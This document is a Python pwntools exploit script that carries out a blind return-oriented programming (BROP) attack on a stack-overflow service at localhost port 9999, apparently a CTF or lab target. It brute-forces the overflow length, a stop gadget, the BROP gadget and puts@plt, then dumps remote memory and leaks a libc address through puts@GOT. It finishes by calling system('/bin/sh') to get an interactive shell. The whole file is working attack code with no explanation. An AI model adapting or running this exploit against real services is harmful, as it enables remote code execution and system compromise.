from pwn import *
from LibcSearcher import *

context.log_level = 'debug'

def get_overflow_len():
    cnt = 70
    while 1 :
        try:
            sh = remote('127.0.0.1',9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            sh.sendline('a' * cnt)
            output = sh.recv()
            sh.close()
            if not output.startswith('No password'):
                log.info("get overflow length:" + hex(cnt - 1))
                return cnt - 1
            else:
                cnt += 1
        except EOFError:
            sh.close()
            log.info("crush,get overflow length:" + hex(cnt - 1))
            return cnt - 1


def get_stop_addr(length):
    addr = 0x4006b0
    while 1:
        try:
            sh = remote('127.0.0.1',9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            payload = 'a' * length + p64(addr) + p64(0) * 10
            sh.sendline(payload)
            output = sh.recv()
            sh.close()
            log.success("get the stop gadget at " + hex(addr))
            return addr          
        except Exception:
            addr +=1
            sh.close()

def check_brop(length,brop_gadget):
    try:
        sh = remote('127.0.0.1',9999)
        payload = 'a' * length + p64(brop_gadget) + p64('a') * 10
        sh.sendline(payload)
        output = sh.recv()
        log.info("check_brop at " + hex(brop_gadget) + output)
        sh.close()
        return False 
    except Exception:
        print "crush in check"
        sh.close()
        return True

def get_brop_addr(length,stop_gadget):
    addr = 0x4007b0
    while 1:
        try:
            sh = remote('127.0.0.1',9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(stop_gadget) + p64(0) * 10
            sh.sendline(payload)
            output = sh.recv()
            sh.close()
            if output != "":
                print "****"
                if(check_brop(length,addr)):
                    log.success("get brop gadget at " + hex(addr))
                    return addr
                else:
                    addr += 1
            else:
                addr += 1
        except Exception:
            print "crush***"
            print hex(addr)
            addr += 1
            sh.close()

def get_puts_plt(length,rdi_ret,stop_gadget):
    puts_plt = 0x400550
    while 1:
        try:
            sh = remote('127.0.0.1',9999)
            sh.recvuntil('WelCome my friend,Do you know password?\n')
            payload = 'a' * length + p64(rdi_ret) + p64(0x400000) + p64(puts_plt) + p64(stop_gadget) 
            sh.sendline(payload)
            output = sh.recv()
            if output.startswith('\x7fELF'):
                log.success("puts_plt at:"+hex(puts_plt))
                return puts_plt
            sh.close()
            puts_plt += 1
        except Exception:
            print "crush"
            sh.close()
            puts_plt += 1

def dump(length,rdi_ret,puts_plt,stop_gadget,base,dump_len):
    cnt = 0
    data = ""
    while cnt < dump_len:
        sh = remote('127.0.0.1',9999)
        sh.recvuntil('WelCome my friend,Do you know password?\n')
        payload = 'a' * length + p64(rdi_ret) + p64(base+cnt) + p64(puts_plt) + p64(stop_gadget) 
        sh.sendline(payload)
        output = sh.recv()
        output = output[:-1]
        print output
        sh.close()
        try:
            output = output[:output.index("\nWel")]
            if output == "":
                output = '\x00'
            cnt += len(output)
            data += output
        except Exception:
            if output == "":
                output = '\x00'
            cnt += len(output)
            data += output

    with open('code','wb') as f:
        f.write(data) 
        

if __name__ == '__main__':
    #length = get_overflow_len()
    length = 72
    #addr = get_stop_addr(length)
    stop_gadget = 0x4006b6
    #brop_gadget = get_brop_addr(length,stop_gadget)
    brop_gadget = 0x4007ba
    rdi_ret = brop_gadget + 0x9
    #puts_plt = get_puts_plt(length,rdi_ret,stop_gadget)
    puts_plt = 0x400560
    #dump(length,rdi_ret,puts_plt,stop_gadget,0x400000,0x1000)
    #dump(length,rdi_ret,puts_plt,stop_gadget,0x600608,1024)
    #raw_input()
    ## leak libc address
    puts_got = 0x601018
    sh = remote('127.0.0.1',9999)
    sh.recvuntil('WelCome my friend,Do you know password?\n')
    payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(stop_gadget) 
    sh.sendline(payload)
    output = sh.recv()
    output = output[:output.index('\nWel')].ljust(8,'\x00')
    puts_addr = u64(output)
    log.success("puts function's address:" + hex(puts_addr))
    libc = LibcSearcher('puts',puts_addr)
    #add_condition()
    libc_base = puts_addr - libc.dump('puts')
    log.success("libc base address:" + hex(libc_base))
    ## get shell
    system = libc_base + libc.dump('system')
    binsh = libc_base + libc.dump('str_bin_sh')
    log.info("system and binsh address:" + hex(system) + "--" + hex(binsh))
    payload = 'a' * length + p64(rdi_ret) + p64(binsh) + p64(system) + p64(stop_gadget)
    sh.sendline(payload)
    output = sh.recv()
    #raw_input()
    print "normal"
    sh.interactive()
    

    
    
